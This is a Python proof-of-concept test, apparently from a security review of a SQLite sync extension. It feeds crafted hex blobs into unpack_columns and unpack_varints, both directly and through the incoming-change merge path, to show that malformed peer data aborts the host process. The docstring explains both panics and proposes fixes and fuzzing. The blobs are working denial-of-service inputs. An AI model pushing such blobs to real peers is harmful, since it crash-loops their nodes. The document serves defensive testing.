"""A malformed blob from a peer ABORTS THE PROCESS — remote DoS via the sync path.

Two separate panics in pack_columns.rs, both reachable from ordinary incoming
`crsql_changes` rows. The extension is built no_std with `panic = "abort"`, so
neither is catchable: the host process dies with SIGTRAP (exit 133). No SQL
error, no rollback, no chance for the application to skip the bad change.

--------------------------------------------------------------------------
A. unpack_columns: the per-value `intlen` field is never bounds-checked
--------------------------------------------------------------------------
pack_columns.rs:241-244

    let column_type_and_maybe_intlen = buf.get_u8();
    let column_type = ColumnType::from_u8(column_type_and_maybe_intlen & 0x07);
    let intlen = (column_type_and_maybe_intlen >> 3 & 0xFF) as usize;
    ...
    if buf.remaining() < intlen { return Err(ResultCode::ABORT); }
    let len = buf.get_int(intlen) as usize;

`intlen` comes straight off the wire and ranges 0..=31. Every guard checks that
enough BYTES REMAIN, which a padded blob satisfies — but `bytes::Buf::get_int(n)`
panics for `n > 8`. So any `intlen` in 9..=31 with enough trailing bytes is an
unconditional abort. intlen=8 is fine, intlen=9 kills the process.

Reached from the merge path via the `pk` column of any incoming change
(changes_vtab_write.rs unpacks it before doing anything else), and from
`SELECT ... FROM crsql_unpack_columns WHERE package = ?`.

--------------------------------------------------------------------------
B. unpack_varints: the count header drives an unbounded allocation
--------------------------------------------------------------------------
pack_columns.rs:467-476

    let (count, header_len) = get_varint(data)?;
    let mut out = Vec::with_capacity(count as usize);

`count` is an attacker-controlled u64 varint. A header of 0xFF*8,0x7F asks for a
~2^63-element Vec and the allocation failure aborts. There is no sanity check
against the remaining buffer length, even though `count` can never exceed
`data.len()` for a well-formed blob.

Reached from the merge path via `col_version` and `seq` on any packed V2-wire
change row.

--------------------------------------------------------------------------
Consequence
--------------------------------------------------------------------------
Any peer that can push a change — or any corruption of those bytes in transit or
on disk — takes the receiving node down, repeatedly: the poisoned change is
still in the sender's feed, so the node dies again on every retry. This is a
crash loop, not a single outage.

Fixes: reject `intlen > 8` in unpack_columns before calling `get_int`; cap
`count` in unpack_varints against the remaining buffer length (`with_capacity`
should never be driven directly by untrusted input) and drop the
`with_capacity` in favour of growing as values are read. Then fuzz both
functions against arbitrary byte strings — neither must ever panic.
"""
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from harness import EXT, fail, ok, run, section

CHILD = r'''
import sys, sqlite3
EXT = %r
mode, hexblob = sys.argv[1], sys.argv[2]
blob = bytes.fromhex(hexblob)
c = sqlite3.connect(":memory:")
c.enable_load_extension(True)
c.load_extension(EXT)
c.isolation_level = None
for k, v in (("metadata-write-version", 3), ("metadata-use-version", 2),
             ("sync-log-version", 2), ("default-ts", 1700000000)):
    c.execute("SELECT crsql_config_set(?, ?)", (k, v))
c.execute("SELECT crsql_set_ts('1700000000')")
c.execute("CREATE TABLE t (id INTEGER PRIMARY KEY NOT NULL, a, b)")
c.execute("SELECT crsql_as_crr('t')")
site = c.execute("SELECT crsql_site_id()").fetchone()[0]

if mode == "vtab":
    c.execute("SELECT cell FROM crsql_unpack_columns WHERE package = ?", (blob,))
elif mode == "pk":
    # malformed pk blob on an ordinary incoming V1-wire change
    c.execute("INSERT INTO crsql_changes VALUES (?,?,?,?,?,?,?,?,?,?)",
              ("t", blob, "a", "v", 1, 1, site, 1, 0, 1700000000))
elif mode == "varint":
    # malformed col_version / seq on an incoming packed V2-wire change
    c.execute("INSERT INTO crsql_changes VALUES (?,?,?,?,?,?,?,?,?,?)",
              ("t", bytes.fromhex("010901"), b"a\x00b", bytes.fromhex("0201090109"),
               blob, 1, site, 1, blob, 1700000000))
print("OK-no-crash")
''' % (EXT,)


def probe(mode, hexblob):
    p = subprocess.run([sys.executable, "-c", CHILD, mode, hexblob],
                       capture_output=True, text=True)
    return p.returncode, ((p.stdout + p.stderr).strip().splitlines() or [""])[-1:]


def died(rc):
    """subprocess reports a fatal signal as -N; a shell would report 128+N."""
    return rc < 0 or rc == 133


def main():
    crashed = []

    section("A. unpack_columns — intlen sweep (get_int panics for n > 8)")
    pad = "00" * 40
    for intlen in (8, 9, 10, 15, 31):
        type_byte = "%02X" % (((intlen << 3) | 1) & 0xFF)
        rc, out = probe("vtab", "01" + type_byte + pad)
        note = "ABORT (SIGTRAP)" if died(rc) else out[0][:60]
        print("     intlen=%-3d type_byte=0x%s  rc=%-4d %s" % (intlen, type_byte, rc, note))
        if died(rc):
            crashed.append("unpack_columns intlen=%d" % intlen)

    section("B. unpack_columns reached through the MERGE PATH (`pk` of an incoming change)")
    for intlen, hexb in ((8, "0141" + "00" * 9), (9, "0149" + "00" * 13)):
        rc, out = probe("pk", hexb)
        note = "ABORT (SIGTRAP)" if died(rc) else out[0][:60]
        print("     pk blob intlen=%-3d rc=%-4d %s" % (intlen, rc, note))
        if died(rc):
            crashed.append("merge path pk blob intlen=%d" % intlen)

    section("C. unpack_varints — count header drives Vec::with_capacity")
    for label, hexb in (("count=2^63-ish", "FFFFFFFFFFFFFFFF7F"),
                        ("count=9 (sane)", "89000000")):
        rc, out = probe("varint", hexb)
        note = "ABORT (SIGTRAP)" if died(rc) else out[0][:60]
        print("     %-16s rc=%-4d %s" % (label, rc, note))
        if died(rc):
            crashed.append("unpack_varints %s" % label)

    section("verdict")
    if crashed:
        fail("a malformed peer blob aborts the process (SIGTRAP), "
             "uncatchable under panic=abort — %d case(s): %s"
             % (len(crashed), ", ".join(crashed)))
    else:
        ok("every malformed blob produced a clean SQL error")


run(main)
